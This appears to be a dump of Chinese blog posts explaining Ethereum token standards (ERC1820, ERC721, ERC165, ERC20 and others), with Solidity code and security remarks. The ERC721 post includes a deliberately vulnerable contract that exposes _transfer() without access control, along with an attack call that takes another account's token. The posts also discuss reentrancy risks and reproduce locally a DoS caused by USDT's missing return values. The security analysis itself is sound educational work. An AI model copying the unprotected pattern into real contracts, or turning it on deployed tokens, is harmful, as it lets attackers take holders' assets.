TestAssembly &#123; event msgdata(bytes); function test() public &#123; emit msgdata(msg.data); &#125; function noThrowCall(address _contract, bytes4 _interfaceId) public returns (uint256 success, uint256 result) &#123; bytes4 erc165ID = 0xf8a8fd6d; assembly &#123; let x := mload(0x40) // Find empty storage location using &quot;free memory pointer&quot; mstore(x, erc165ID) // Place signature at beginning of empty storage mstore(add(x, 0x04), _interfaceId) // Place first argument directly next to signature success := call( gas(), // 30k gas _contract, // To addr 0, // msg.value x, // Inputs are stored at location x 0x24, // Inputs are 36 (4 + 32) bytes long x, // Store output over input (saves space) 0x20 // Outputs are 32 bytes long ) result := mload(x) // Load the result &#125; &#125;&#125; 当 _interfaceId为 uint32类型时： 12345678910111213141516171819202122232425262728293031323334pragma solidity ^0.8.0;contract TestAssembly &#123; event msgdata(bytes); function test() public &#123; emit msgdata(msg.data); &#125; function noThrowCall(address _contract, uint32 _interfaceId) public returns (uint256 success, uint256 result) &#123; bytes4 erc165ID = 0xf8a8fd6d; assembly &#123; let x := mload(0x40) // Find empty storage location using &quot;free memory pointer&quot; mstore(x, erc165ID) // Place signature at beginning of empty storage mstore(add(x, 0x04), _interfaceId) // Place first argument directly next to signature success := call( gas(), // 30k gas _contract, // To addr 0, // msg.value x, // Inputs are stored at location x 0x24, // Inputs are 36 (4 + 32) bytes long x, // Store output over input (saves space) 0x20 // Outputs are 32 bytes long ) result := mload(x) // Load the result &#125; &#125;&#125; 所以对于 bytes(n)类型的操作，写入方式为从高位写入（即左端写入），而对于uint(n)类型则是从低位写入（即右端写入）。 ***implementsERC165InterfaceNoCache(address _contract, bytes4 _interfaceId)***函数，作用是在不使用或更新缓存的情况下检查合约是否实现IERC165接口，且是否实现 _interfaceId接口。检查的方式很简单，即调用noThrowCall()函数，只有当函数调用成功，且实现了 _interfaceId 接口（即 result&#x3D;&#x3D;true ）时，该函数才返回true。 ***isERC165Interface(bytes32 _interfaceHash)***函数用来检测，传入的接口hash值是不是IERC165接口，判断方法就是：对传入的参数进行与运算，如果后28为0，那么则判断该接口为IERC165接口。 ***implementsERC165Interface(address _contract, bytes4 _interfaceId)***函数，作用是检查 _contract合约是否实现了 _interfaceId(多指IERC165)，如果不在缓存表中存储过，则通过implementsERC165InterfaceNoCache() 函数检测，如果在缓存表中，则判断用于实现 _interfaceId的合约是不是参数 _contract本身，yes return true，no return false。 ***updateERC165Cache(address _contract, bytes4 _interfaceId)***函数，通过implementsERC165InterfaceNoCache()函数来判断 _contract 是否实现了 _interfaceId，如果实现了则更新 interfaces映射，同时更新缓存（这个换成始终都是被设置为true，有什么用呢？我的理解是，在implementsERC165Interface()函数中就用的了这个映射，如果这个映射的值为 fasle则会调用implementsERC165InterfaceNoCache()函数，那么如果值为true那么则不需要调用。那么这样一来就可以节约gas的花费了）。 ***getManager(address _addr)***函数，查询某地址的管理员是谁，如果没有管理员，则返回自己（相对于自己的管理员是自己）。 ***setManager(address _addr, address _newManager)***函数，设置管理员，确保只能是 _addr的管理员亲自调用，如果管理员给自己又设置一边管理员，那么managers[_addr] =address(0)，相对于重置管理员了，管理员变成了_addr自己。 ***getInterfaceImplementer(address _addr, bytes32 _interfaceHash)***函数，查询地址是否实现了接口以及通过哪个合约实现的，如果 _addr是零地址则将 _addr看作是msg.sender。先判断是 IERC165接口hash吗，如果是，则通过implementsERC165Interface()来获取实现的地址，如果不是则通过映射interfaces来查看。 ***setInterfaceImplementer(address _addr, bytes32 _interfaceHash, address _implementer)***：设置某个地址的接口由哪个合约实现，需要由管理员来设置，待设置的关联接口的地址（如果’_addr’是零地址，则假定为’msg.sender’），而且 _interfaceHash 不能为 IERC165，然后通过实现者_implementer的canImplementInterfaceForAddress()函数来检测，如果实现了则通过。这个函数可以在这里：链接看到实现逻辑（这里需要注意重入风险，具体情况具体分析）。 注：ERC1820ImplementerInterface(_implementer).canImplementInterfaceForAddress(_interfaceHash, addr)这行代码很重要，有重入风险，同时要求实现者_implementer必须按要求返回指定的值ERC1820_ACCEPT_MAGIC。 3. 总结 ERC1820协议主要用于以太坊智能合约的接口查询和管理。它为智能合约之间的交互提供了标准化的方式，使得合约可以公开声明并查询它们所实现的接口。这对于智能合约的互操作性和扩展性非常重要。 以下是一些具体的应用场景： 合约功能发现：通过ERC1820协议，合约可以公开声明它们实现的接口，其他合约就可以查询这些接口，了解如何与该合约交互。这使得合约之间的交互更为灵活和高效。 合约升级：智能合约一旦部署，其代码就不能更改。但是，通过ERC1820协议，可以将接口实现的逻辑放在另一个可以升级的合约中。这样，即使主合约的代码不变，也可以通过更改实现接口的合约来升级功能。 合约互操作性：ERC1820协议支持任意接口的注册，这使得不同的合约可以实现和支持各种各样的接口，大大增强了合约之间的互操作性。 合约安全性：ERC1820协议的查询机制可以避免对未实现特定接口的合约进行错误的调用，从而增加了智能合约的安全性。 总的来说，ERC1820协议的作用就是提供了一种标准化的方式，让智能合约可以公开声明和查询接口，从而简化了合约之间的互动。 有了这些前置知识，就可以继续学习ERC777了。","categories":[{"name":"DEFI","slug":"DEFI","permalink":"https://biyouqiuqiu.com/categories/DEFI/"},{"name":"ERC","slug":"DEFI/ERC","permalink":"https://biyouqiuqiu.com/categories/DEFI/ERC/"}],"tags":[{"name":"ERC","slug":"ERC","permalink":"https://biyouqiuqiu.com/tags/ERC/"},{"name":"ERC1820","slug":"ERC1820","permalink":"https://biyouqiuqiu.com/tags/ERC1820/"}]},{"title":"ERC721 未完成","slug":"DEFI/ERC/ERC721","date":"2024-01-05T04:00:00.000Z","updated":"2024-01-05T04:00:00.000Z","comments":true,"path":"2024/01/05/DEFI/ERC/ERC721/","link":"","permalink":"https://biyouqiuqiu.com/2024/01/05/DEFI/ERC/ERC721/","excerpt":"","text":"1. ERC721简介 ​ 该协议允许在智能合约中实施NFT标准API。该标准提供了跟踪和传输NFT的基本功能。 ​ 首先了解什么是非同质化代币，NTF 的全称是 Non-Fungible Token，即非同质化代币。非同质化的意思是某物不可与另一物互换，它是独一无二的。例如，我家的钥匙和你家的钥匙，看起来都是钥匙，但是不能交换的，因为我家的钥匙打不开你家的门，反之你的钥匙也是。 ​ ERC721和ERC20一样，都是一个代币标准，ERC721代币是不可细分的，每一个代币都是唯一的。每一个ERC721代币都有自己的标识符，通常用于表示独立的资产，例如数字艺术品，游戏中的虚拟角色或房地产。 2. 解析代码源码来自：链接。 2.1 Core部分2.1.1 IERC721.sol接口内容： 1234567891011121314151617// SPDX-License-Identifier: MITpragma solidity ^0.8.20;interface IERC721 is IERC165 &#123; event Transfer(address indexed from, address indexed to, uint256 indexed tokenId); event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId); event ApprovalForAll(address indexed owner, address indexed operator, bool approved); function balanceOf(address owner) external view returns (uint256 balance); function ownerOf(uint256 tokenId) external view returns (address owner); function safeTransferFrom(address from, address to, uint256 tokenId, bytes calldata data) external; function safeTransferFrom(address from, address to, uint256 tokenId) external; function transferFrom(address from, address to, uint256 tokenId) external; function approve(address to, uint256 tokenId) external; function setApprovalForAll(address operator, bool approved) external; function getApproved(uint256 tokenId) external view returns (address operator); function isApprovedForAll(address owner, address operator) external view returns (bool);&#125; 分析各接口的功能： balanceOf(): 返回由_owner 持有的NFTs的数量。 ownerOf(): 返回tokenId代币持有者的地址。 approve(): 授予地址_to具有_tokenId的控制权，方法成功后需触发Approval 事件。 setApprovalForAll(): 授予地址_operator具有所有NFTs的控制权，成功后需触发ApprovalForAll事件。 getApproved()、isApprovedForAll(): 用来查询授权。 transferFrom()：用来转移NFT，接收者不能为零地址，且msg.sender须要被ownerOf(tokenId)授权，执行完transferFrom之后，msg.sender的权限便会被移除。 safeTransferFrom()：用来转移NFT，功能和 transferFrom一样，但是一些要求，如果receiver是一个合约，那么该合约需要实现ERC721TokenReceiver::onERC721Received(address _from, uint256 _tokenId, bytes data) external returns(bytes4) 函数，同时返回值为：bytes4(keccak256(&quot;onERC721Received(address,uint256,bytes)&quot;))，因为在调用safeTransferFrom函数时，会对 receiver 进行检测，如果recever是EOA也是可以的。 transferFrom和safeTransferFrom的区别，后面再详细说明。 2.1.2 IERC721Metadata该接口和 IERC20Metadata 类似，都是可选择的。该接口是用来存储额外数据的，比如代币的name，symbol以及URI。 这个URI可以是图片链接等。 2.1.3 IERC721Enumerable12345interface ERC721Enumerable &#123; function totalSupply() external view returns (uint256); function tokenByIndex(uint256 _index) external view returns (uint256); function tokenOfOwnerByIndex(address _owner, uint256 _index) external view returns (uint256);&#125; 该接口提供了三个函数，旨在提高NTF的可读性和可访问性，同时也进一步完善了NTF交易市场的功能，这些功能可用于查询NTF市场发行了多少代币，某人的第index号代币的tokenId是多少，还可以根据发行的index找到对应的tokenId。 totalSupply() ：返回发行Token的总量。 tokenByIndex()：根据索引返回对应的tokenId。 tokenOfOwnerByIndex()：根据索引查询所有者Token列表中对应索引的tokenId。 2.1.4 ERC721​ 这个合约是ERC-721协议中最重要也是最核心的部分，需要重点解读。 _update()函数是贯穿了，铸币，销币，以及转币，所以首先要重点看懂这个函数，代码如下： 123456789101112131415161718192021222324252627282930function _update(address to, uint256 tokenId, address auth) internal virtual returns (address) &#123; address from = _ownerOf(tokenId); // Perform (optional) operator check if (auth != address(0)) &#123; _checkAuthorized(from, auth, tokenId); &#125; // Execute the update if (from != address(0)) &#123; // Clear approval. No need to re-authorize or emit the Approval event _approve(address(0), tokenId, address(0), false); unchecked &#123; _balances[from] -= 1; &#125; &#125; if (to != address(0)) &#123; unchecked &#123; _balances[to] += 1; &#125; &#125; _owners[tokenId] = to; emit Transfer(from, to, tokenId); return from;&#125; 其中参数是需要明确的，to是待转移的地址，可以理解为 接收者receiver；tokenId是待操作的token；auth是代币的所有者或是被授权者。 _update()是如何实现mint、burn和transferFrom的，函数的执行逻辑： 首先第一步都是获取待操作的tokenId的所有者。 mint的实现，调用方式为：_update(to, tokenId, address(0)) 函数执行，from的值为零地址，程序直接执行到第三个if语句，to的_balance加一，该tokenId的所有者为to transferFrom的实现，safeTransferFrom同样是调用transferFrom，调用的方式为：address previousOwner = _update(to, tokenId, _msgSender())，首先可以知道to不为零地址，_msgSender()也不为零，至少目前零地址的私钥还没人知道。函数执行，from的值为代币所有者，进入第一个if语句，如果auth是代币所有者或是被授权者则通过检测，进入第二个if语句，移除原tokenId所有者对其他人的授权，代币所有者的token数减一，最后进入第三个if语句，接收者的token数加一，更新mapping。 burn的实现，调用方法：_update(address(0), tokenId, address(0))，进入第二个if语句，移除原tokenId所有者对其他人的授权，代币所有者的token数减一，将代币所有者设置为零地址。 transfer的实现，调用方式为：_update(to, tokenId, address(0))，首先to不为零，进入第二个if语句，移除原tokenId所有者对其他人的授权，代币所有者的token数减一，最后进入第三个if语句，接收者的token数加一，更新mapping。 合约中还有几个映射： _owners：保存某个tokenId的所有者。 _balances：保存某个用户拥有的Token数量。 _tokenApprovals：保存某个token的授权账户。 _operatorApprovals：保存某账户是否将所有的token全部授权给某账户。 _checkAuthorized(address owner, address spender, uint256 tokenId)函数负责检测对于指定tokenId，owner和spender的关系，只有当spender不为零地址，且（owner&#x3D;&#x3D;spender【代币所有者亲自操作】或owner将所有代币授权给了spender，或owner将tokenId这枚token授权给了spender）才可以通过。 2.1.5 ERC721Enumerable该合同继承了ERC721，但是重写了 ERC721中的 _update()函数，这一操作使得ERC721中的 铸币、销币、转账都繁发生了变化。 题外话 这是solidity继承的基本知识，验证如下： 1234567891011121314151617contract Person &#123; function eat() public virtual &#123; console.log(&quot;Person&quot;); &#125; function call() public &#123; eat(); &#125;&#125;contract Man is Person &#123; function eat() public override &#123; console.log(&quot;Man&quot;); &#125;&#125; 复现逻辑：部署Man合约，并调用call函数看看输出结果是什么。 就是Man，虽然call函数声明在父类中，但是父类会调用子类重写的eat函数，这可以理解为【就近原则】。 看到该合约_update的实现逻辑： 12345678910111213141516function _update(address to, uint256 tokenId, address auth) internal virtual override returns (address) &#123; address previousOwner = super._update(to, tokenId, auth); if (previousOwner == address(0)) &#123; _addTokenToAllTokensEnumeration(tokenId); &#125; else if (previousOwner != to) &#123; _removeTokenFromOwnerEnumeration(previousOwner, tokenId); &#125; if (to == address(0)) &#123; _removeTokenFromAllTokensEnumeration(tokenId); &#125; else if (previousOwner != to) &#123; _addTokenToOwnerEnumeration(to, tokenId); &#125; return previousOwner;&#125; ta调用了父类的_update函数，说明代币的转移逻辑还是还ERC721的一样，只是根据 tokenId的所有者以及接收者进行了一些对数组的添加和删除操作。利用数组来记录代币的发行量。 2.1.6 IERC721Receiver​ 该合约只有一个函数，则是 onERC721Received()，这是当接收者 to 为合约地址时，在调用ERC721中的三个safe函数（_safeMint, _safeTransfer, safeTransferFrom）时的回调函数。实现这个接口的作用是什么呢？为什么当to为EOA时则可以不需要实现这个方法呢？我的理解是，如果有人向我tx.origin转入 ERC721 token的时候，我可以去调用transferFrom或者safeTransferFrom函数将手中的代币转出去，但是如果转入的是合约地址，那么如果你实现没有提供调用 ransferFrom或者safeTransferFrom函数 的功能，那么这个token将永远的留在了这个合约中，无法转移出去。而明确要求合约接收者实现这个函数，这是为了让接收者有意识地去处理接收到的token。当然，要是实现了接口而函数体只是按照要求返回固定值，那么还是会被锁死这个token，因为人家提醒你了，做不做就是自己的事了。 2.2 Extensions部分2.2.1 ERC721Pausable​ 该合约提供了一个紧急暂停功能，比如在合约被黑客攻击时，合约通过可以修饰器锁住所有的转账功能，这是一种防护措施。 2.2.2 ERC721Burnable​ 该合约对外提供了一个销币的功能。 2.2.3 ERC721Consecutive2.2.4 ERC721URIStorage​ 该合约提供了一个设置 tokenURI的函数：_setTokenURI(uint256 tokenId, string memory _tokenURI)，使其tokenId在mint的时候，就可以与某个URI绑定起来。 2.2.5 ERC721Votes2.2.6 ERC721Royalty2.2.7 ERC721Wrapper​ 该合约提供了一个包装功能，比如 用户将手中的 _underlying代币存入到该合约中，那么该合约会为用户铸造一个相同tokenId的代币，同理取出的话，会将用户从该合约获取的tokenId全部销毁，销毁的方式为：_update(address(0), tokenId, _msgSender())(突然感觉，这个update函数真的太牛了，这个兼容性真的，佩服的很。)合约还实现了onERC721Received函数，实现逻辑如下： 1234567function onERC721Received(address, address from, uint256 tokenId, bytes memory) public virtual returns (bytes4) &#123; if (address(underlying()) != _msgSender()) &#123; revert ERC721UnsupportedToken(_msgSender()); &#125; _safeMint(from, tokenId); return IERC721Receiver.onERC721Received.selector;&#125; 这个函数是为了让其他用户通过 _underlying 的 safeTransferFrom 向这个合约转移代币的时候，同时为用户包装代币。正是因为接口如此实现，所以在 depositFor函数中使用的转账函数为:transferFrom()。 不过在 depositFor() 和 withdrawTo()函数中都有重入的风险，depositFor::_safeMint()，withdrawTo::safeTransferFrom()。 2.3 Utilies部分2.3.1 ERC721Utils.sol​ 提供了一个校验功能，检验合约接收者是否实现了 IERC721Receiver 接口，实现checkOnERC721Received函数的时候，是否按要求返回了 IERC721Receiver.onERC721Received.selector。 3. 安全隐患3.1 内部函数_transfer的安全隐患在ERC721合约中，有一个内部函数 _transfer()，这函数有点奇怪，它可以实现任意转移某人的token，前提是只要知道tokenId以及ta的owner。可以看到他的实现代码： 1234567891011function _transfer(address from, address to, uint256 tokenId) internal &#123; if (to == address(0)) &#123; revert ERC721InvalidReceiver(address(0)); &#125; address previousOwner = _update(to, tokenId, address(0)); if (previousOwner == address(0)) &#123; revert ERC721NonexistentToken(tokenId); &#125; else if (previousOwner != from) &#123; revert ERC721IncorrectOwner(from, tokenId, previousOwner); &#125;&#125; 因为ta对_update的调用方式为：_update(to, tokenId, address(0))，即auth参数是零地址，则可以跳过第一个if语句的判断，换句话说就是不要验证身份。写了一个简单的示例代码进行复现： 1234567891011121314151617pragma solidity ^0.8.20;import &quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol&quot;;contract Test is ERC721(&quot;ERC721&quot;, &quot;erc721&quot;) &#123; uint256 public tokenId; function mint() public &#123; _mint(msg.sender, tokenId); tokenId++; &#125; function transfer(address from, address to, uint256 tokenId) public &#123; _transfer(from, to, tokenId); &#125;&#125; 攻击逻辑，假如A：0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266账户拥有tokenId为0，1，2，3四个代币。并且我：0x70997970C51812dc3A010C7d01b50e0d17dc79C8知道A的地址以及tokenId，那么我可以调用 这样调用transfer(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266,0x70997970C51812dc3A010C7d01b50e0d17dc79C8,0)，则可以完成攻击，此时查看 ownerOf(0)的所有者是不是我 结果很明显，我拥有了0号代币。同理，内部的_safeTransfer()也是同样的道理，只不过需要接收者实现指定的接口，但是这都无关紧要，钱还是可以照样拿走的。 如果你的合约继承了ERC721合约，并且调用了它的内部函数 _transfer()，则一定要给这个外部函数添加访问控制。加了访问控制之后，这个函数可以看作是管理员权限级别的，可以强制转移某人的代币。 3.2 transferFrom VS safeTransferFrom​ 字面意思safeTransferFrom多了一个 safe前缀，看起来要比 transferFrom函数要更安全，在 ERC-721说明文档中也是这样说的，但是真的是这样吗？emmm，只能说各有各的安全吧。safeTransferFrom的安全之后在于，合约接收者必须要实现指定的接收函数，旨在让用户正确处理token（至少让token还能再次转移嘛），而transferFrom没有这个功能，要是直接转入给合约接收者，且合约接收者没有事先做好处理这笔token的操作，那么很遗憾，这笔token锁死了。。。这样想想safeTransferFrom确实要安全一点。但是执行safeTransferFrom的时候，会执行合约接收者的onERC721Received函数，及其类似 fallback，那么就会存在重入的风险，而transferFrom就没有。总而言之，各有各的好，各有各的坏。 3.3 其他的重入风险在ERC721的内部函数中，_safeMint()，_safeTransfer()都是具有重入的风险的。所以要是继承ERC721合约的项目，如果将这些内部函数暴露出来的话，这需要特别小心这几个点。","categories":[{"name":"DEFI","slug":"DEFI","permalink":"https://biyouqiuqiu.com/categories/DEFI/"},{"name":"ERC","slug":"DEFI/ERC","permalink":"https://biyouqiuqiu.com/categories/DEFI/ERC/"}],"tags":[{"name":"ERC","slug":"ERC","permalink":"https://biyouqiuqiu.com/tags/ERC/"},{"name":"ERC721","slug":"ERC721","permalink":"https://biyouqiuqiu.com/tags/ERC721/"}]},{"title":"ERC173","slug":"DEFI/ERC/ERC173","date":"2024-01-03T04:00:00.000Z","updated":"2024-01-03T04:00:00.000Z","comments":true,"path":"2024/01/03/DEFI/ERC/ERC173/","link":"","permalink":"https://biyouqiuqiu.com/2024/01/03/DEFI/ERC/ERC173/","excerpt":"","text":"1. ERC173简介 ​ 该协议定义了拥有或控制合约的标准功能。 2. ERC173的工作原理ERC-173还要求合约同时还应该实现ERC165接口。 接口如下： 123456789101112131415interface ERC173 /* is ERC165 */ &#123; /// @dev This emits when ownership of a contract changes. event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); /// @notice Get the address of the owner /// @return The address of the owner. function owner() view external returns(address); /// @notice Set the address of the new owner of the contract /// @dev Set _newOwner to address(0) to renounce any ownership. /// @param _newOwner The address of the new owner of the contract function transferOwnership(address _newOwner) external; &#125; ​ 查询当前合约的owner，以及转让当前合约的所有权。 注：如果执行转移所有权操作的时候，应该注意_newOwner的值不能为零地址，如果将合约转移给了零地址，那么该合约将不属于任何人。 3. 与Ownable.sol的区别Ownable.sol是基于ERC173的理念拓展完善的，丰富了关于owner的相关操作，比如对owner的检查，还有对不能将还有转让给零地址；同时也加入了一些访问控制，让transferOwnership函数更安全。","categories":[{"name":"DEFI","slug":"DEFI","permalink":"https://biyouqiuqiu.com/categories/DEFI/"},{"name":"ERC","slug":"DEFI/ERC","permalink":"https://biyouqiuqiu.com/categories/DEFI/ERC/"}],"tags":[{"name":"ERC","slug":"ERC","permalink":"https://biyouqiuqiu.com/tags/ERC/"},{"name":"ERC173","slug":"ERC173","permalink":"https://biyouqiuqiu.com/tags/ERC173/"}]},{"title":"ERC191&ERC601","slug":"DEFI/ERC/ERC191&ERC601","date":"2024-01-03T04:00:00.000Z","updated":"2024-01-03T04:00:00.000Z","comments":true,"path":"2024/01/03/DEFI/ERC/ERC191&ERC601/","link":"","permalink":"https://biyouqiuqiu.com/2024/01/03/DEFI/ERC/ERC191&ERC601/","excerpt":"","text":"1. ERC191 提出了关于如何处理以太坊中签名数据的规范。 简单理解就是在待签名的消息或者交易的hash，前加入&quot;\\x19Ethereum Signed Message:\\n&quot; + len(message)，而len(message)通常来说是32，所以很多在平时的做题或者在靶场中见到的是 12bytes memory prefix = &quot;\\x19Ethereum Signed Message:\\n32&quot;;bytes32 result = keccak256(abi.encodePacked(prefix, hash)); 但是这和直接实用metamask进行签名的结果不一样，但是通过 ecrecover求出来的地址是一样的。 2. ERC601 这个提案的目的是为了更好地适应以太坊的独特需求，以解决“不同的以太坊客户端和钱包使用不同的衍生路径，其中一些路径违反了 BIP44，该标准定义了以m/44&#39;/.这会造成钱包实现之间的混乱和不兼容，在某些情况下，一个钱包中的资金无法在另一个钱包上访问，而在其他情况下，则需要手动提示用户提供派生路径，这会妨碍可用性”的问题。 替代方案为，在BIP32路径中定义一下四个级别 1m / purpose&#x27; / subpurpose&#x27; / EIP&#x27; / wallet&#x27; 具体内容可以，移步到这里：链接。","categories":[{"name":"DEFI","slug":"DEFI","permalink":"https://biyouqiuqiu.com/categories/DEFI/"},{"name":"ERC","slug":"DEFI/ERC","permalink":"https://biyouqiuqiu.com/categories/DEFI/ERC/"}],"tags":[{"name":"ERC","slug":"ERC","permalink":"https://biyouqiuqiu.com/tags/ERC/"},{"name":"ERC191","slug":"ERC191","permalink":"https://biyouqiuqiu.com/tags/ERC191/"},{"name":"ERC601","slug":"ERC601","permalink":"https://biyouqiuqiu.com/tags/ERC601/"}]},{"title":"ERC165","slug":"DEFI/ERC/ERC165","date":"2024-01-02T04:00:00.000Z","updated":"2024-01-02T04:00:00.000Z","comments":true,"path":"2024/01/02/DEFI/ERC/ERC165/","link":"","permalink":"https://biyouqiuqiu.com/2024/01/02/DEFI/ERC/ERC165/","excerpt":"","text":"1. ERC165简介 ​ 简单来说该协议是用来检测智能合约是否实现了某个接口。 2. ERC165的工作原理​ ERC165中只定义了一个函数，即supportsInterface()，如下： 1234567891011pragma solidity ^0.4.20;interface ERC165 &#123; /// @notice Query if a contract implements an interface /// @param interfaceID The interface identifier, as specified in ERC-165 /// @dev Interface identification is specified in ERC-165. This function /// uses less than 30,000 gas. /// @return `true` if the contract implements `interfaceID` and /// `interfaceID` is not 0xffffffff, `false` otherwise function supportsInterface(bytes4 interfaceID) external view returns (bool);&#125; ​ 简单来说，如果要判断A是否实现了SUPER接口，则A需要实现ERC165中的函数，判断原理则是，调用A中的supportsInterface函数，该函数会判等传入的参数，如果A实现了SUPER的接口，那么函数体的内容应该是： 123function supportsInterface(bytes4 interfaceID) external view returns (bool) &#123; return type(SUPER).interfaceId == interfaceID;&#125; 这样就可以初步判断该合约实现了某一接口，但是仅仅初步，因为你可以自己编写函数体的返回值，比如我没有实现B接口，我可以自己设置返回值为： 123function supportsInterface(bytes4 interfaceID) external view returns (bool) &#123; return type(B).interfaceId == interfaceID;&#125; 而合约中并没有实现B接口中函数。比如，别人问你有钱吗，你甩出一张银行卡说里面有一个“小目标”，当然因为你看不见银行卡里面有多少钱，你暂且可以相信你有钱。就好比调用supportsInterface函数来初步判断。具体是否实现这些函数，还得具体调用某些功能来检测才行。 3. ERC165接口的计算原理- 一个接口的的interfaceID是通过，计算接口中所有函数选择器的异或值，即Dog的interfaceID计算如下 123456789101112131415// SPDX-License-Identifier: MITpragma solidity 0.8.17;interface Dog &#123; function eat() external; function shout() external;&#125;contract Test &#123; function calDogInterfaceID() external pure returns(bytes4, bytes4) &#123; bytes4 result = Dog.eat.selector ^ Dog.shout.selector; return (type(Dog).interfaceId, result); &#125;&#125; 当然也会有接口继承的时候，假如Cat接口继承了Animals接口，那么判断是否实现Cat接口该如何计算interfaceId，只需要计算在Cat接口中定义的函数即可。 123456789101112131415161718192021// SPDX-License-Identifier: MITpragma solidity 0.8.17;interface Animals &#123; function run() external; function breath() external;&#125;interface Dog &#123; function eat() external; function shout() external;&#125;contract Test &#123; function calDogInterfaceID() external pure returns(bytes4, bytes4) &#123; bytes4 result = Dog.eat.selector ^ Dog.shout.selector; return (type(Dog).interfaceId, result); &#125;&#125; 根据运行结果可验证：","categories":[{"name":"DEFI","slug":"DEFI","permalink":"https://biyouqiuqiu.com/categories/DEFI/"},{"name":"ERC","slug":"DEFI/ERC","permalink":"https://biyouqiuqiu.com/categories/DEFI/ERC/"}],"tags":[{"name":"ERC","slug":"ERC","permalink":"https://biyouqiuqiu.com/tags/ERC/"},{"name":"ERC165","slug":"ERC165","permalink":"https://biyouqiuqiu.com/tags/ERC165/"}]},{"title":"ERC20","slug":"DEFI/ERC/ERC20","date":"2024-01-01T04:00:00.000Z","updated":"2024-01-01T04:00:00.000Z","comments":true,"path":"2024/01/01/DEFI/ERC/ERC20/","link":"","permalink":"https://biyouqiuqiu.com/2024/01/01/DEFI/ERC/ERC20/","excerpt":"","text":"1. ERC20简介 ​ ERC20是以太坊区块链创建的可替代的技术标准，可替代代币是可以与另一种代币进行交换的代币，故此ERC20代币是一种同质化代币。ERC20协议更像是一种规范，规范了在智能合约中实施代币的标准API，使得代币具有基本的转账功能，以便其他链上第三方可以使用。 ERC20接口： 123456789101112pragma solidity ^0.8.20;interface IERC20 &#123; event Transfer(address indexed from, address indexed to, uint256 value); event Approval(address indexed owner, address indexed spender, uint256 value); function totalSupply() external view returns (uint256); function balanceOf(address account) external view returns (uint256); function transfer(address to, uint256 value) external returns (bool); function allowance(address owner, address spender) external view returns (uint256); function approve(address spender, uint256 value) external returns (bool); function transferFrom(address from, address to, uint256 value) external returns (bool);&#125; ​ 这是ERC20最基本的也是最重要的功能，凡是遵循ERC20标准的都需要实现该接口。这几个方法很简单，transferFrom()函数还是要值得注意，该函数的使用方式是，from需要提前为msg.sender授权，即需要from去亲自调用approve()函数。只有 from为msg.sender授权之后，transferFrom()函数才能够成功执行，这是在平时打CTF的时候经常容易忽视的操作，写完攻击逻辑之后，最后报错。。。才发现是在某些合约里的某些函数中的转账逻辑是transferFrom()，由于没有授权导致的。 2. USDT的坑2.1 USDT的问题所在​ 还有一个值得注意的点是，transfer()和transferFrom()都是有返回值的！！！！为什么主要，就是因为全球使用最广的稳定币的源码中transfer()和transferFrom()是没有返回值，这是一个坑！！！大坑！！！ 可以到 浏览器看到Tether Token（USDT）的源码，可以看到这两个函数： TetherToknen.sol: 123456789101112131415function transfer(address _to, uint _value) whenNotPaused &#123; if (deprecated) &#123; return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value); &#125; else &#123; return super.transfer(_to, _value); &#125;&#125;function transferFrom(address _from, address _to, uint _value) whenNotPaused &#123; if (deprecated) &#123; return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value); &#125; else &#123; return super.transferFrom(_from, _to, _value); &#125;&#125; 这里两个函数是没有返回值，即使它调用的是父类的函数，在没有看到父类的具体函数实现，姑且说它的父类是有返回值的，但是子类中的函数是没有返回值，这是在Remix中编译不过去的，举例： 可以看到编译通过了。下面是子合约函数中没有返回值的： 所以不用去父类中找函数都可以知道父类的函数也是没有返回值的，不信就去验证一下： BasicToken.sol::transfer() 123456789101112function transfer(address _to, uint _value) onlyPayloadSize(2 * 32) &#123; uint fee = (_value.mul(basisPointsRate)).div(10000); if (fee &gt; maximumFee) &#123; fee = maximumFee; &#125; uint sendAmount = _value.sub(fee); balances[msg.sender] = balances[msg.sender].sub(_value); balances[_to] = balances[_to].add(sendAmount); balances[owner] = balances[owner].add(fee); Transfer(msg.sender, _to, sendAmount); Transfer(msg.sender, owner, fee);&#125; StandardToken.sol::transferFrom() 123456789101112131415161718function transferFrom(address _from, address _to, uint _value) onlyPayloadSize(3 * 32) &#123; var _allowance = allowed[_from][msg.sender]; uint fee = (_value.mul(basisPointsRate)).div(10000); if (fee &gt; maximumFee) &#123; fee = maximumFee; &#125; uint sendAmount = _value.sub(fee); balances[_to] = balances[_to].add(sendAmount); balances[owner] = balances[owner].add(fee); balances[_from] = balances[_from].sub(_value); if (_allowance &lt; MAX_UINT) &#123; allowed[_from][msg.sender] = _allowance.sub(_value); &#125; Transfer(_from, _to, sendAmount); Transfer(_from, owner, fee);&#125; 2.2 复现DOS异常​ 本地复现。 ​ 本地部署USDT，地址为：0x5FbDB2315678afecb367f032d93F642f64180aa3。 ​ 再部署一个转移代币的 TokenTransfer.sol，地址为：0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512。 12345678910111213141516171819202122232425262728293031323334353637383940// SPDX-License-Identifier: MITpragma solidity 0.8.20;interface IERC20_USDT &#123; function transfer(address, uint256) external; function transferFrom(address, address, uint256) external;&#125;interface IERC20_stad &#123; function transfer(address, uint256) external returns(bool); function transferFrom(address, address, uint256) external returns(bool);&#125;// USDT: 0x5FbDB2315678afecb367f032d93F642f64180aa3contract TokenTransfer &#123; IERC20_USDT USDT; IERC20_stad TOKEN; constructor(address _usdt) &#123; USDT = IERC20_USDT(_usdt); TOKEN = IERC20_stad(_usdt); &#125; function test_TransferWithOutReturnValue() external &#123; USDT.transfer(msg.sender, 10); &#125; function test_TransferWithReturnValue() external &#123; TOKEN.transfer(msg.sender, 10); &#125; function test_TransferFromWithOutReturnValue() external &#123; USDT.transferFrom(msg.sender, 0x71bE63f3384f5fb98995898A86B02Fb2426c5788, 1); &#125; function test_TransferFromWithReturnValue() external &#123; TOKEN.transferFrom(msg.sender, 0x71bE63f3384f5fb98995898A86B02Fb2426c5788, 1); &#125;&#125; ​ 该合约主要是测试transfer和transferFrom函数，定义两个接口，一个接口中有返回值，一个没有，模拟将USDT转入一个遵循ERC20标准的合约，看看是否能将转入的ERC20 Token转出。 ​ 